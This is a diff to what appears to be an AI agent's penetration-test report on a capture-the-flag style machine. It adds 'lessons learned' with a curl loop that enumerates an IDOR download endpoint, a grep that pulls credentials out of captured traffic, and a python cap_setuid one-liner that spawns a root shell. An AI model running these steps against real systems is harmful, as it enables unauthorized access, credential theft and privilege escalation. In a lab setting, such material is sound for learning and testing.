@@ -42,3 +42,34 @@ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
 ## Report Location
 `/home/raquel/.openclaw/workspace/reports/10.129.32.156/security-report.md`
+
+## Methodology Improvements (Lessons for Future Boxes)
+
+### What I Should Have Done Faster:
+1. **Check /download endpoints immediately** when seeing /data/<id> patterns
+2. **Analyze ALL PCAP files** from IDOR, not just the first one with content
+3. **Start with /data/0 or /download/0** - historical data often has credentials
+4. **Don't brute force passwords blindly** - look for credential leaks first
+
+### Red Flags I Missed:
+- `/data/<sequential_id>` pattern = likely IDOR to historical data
+- "Packet Capture" in app name = check /download immediately
+- FTP traffic in PCAP = credentials likely in cleartext
+
+### Better Approach Next Time:
+```bash
+# When seeing /data/<id> or /capture endpoints:
+1. Trigger capture: curl http://TARGET/capture
+2. Check IDOR range: for i in {0..20}; do curl -s http://TARGET/download/$i -o /tmp/dl_$i; done
+3. Find non-empty files: for f in /tmp/dl_*; do [ $(wc -c < $f) -gt 100 ] && echo "$f"; done
+4. Extract credentials: strings /tmp/dl_*.bin | grep -iE "USER|PASS|password"
+5. Test credentials on SSH immediately
+```
+
+### Capability Privesc Checklist:
+```bash
+# After ANY initial access:
+getcap -r / 2>/dev/null | grep -v "^$"
+# If python/perl/ruby/node has cap_setuid:
+# <binary> -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
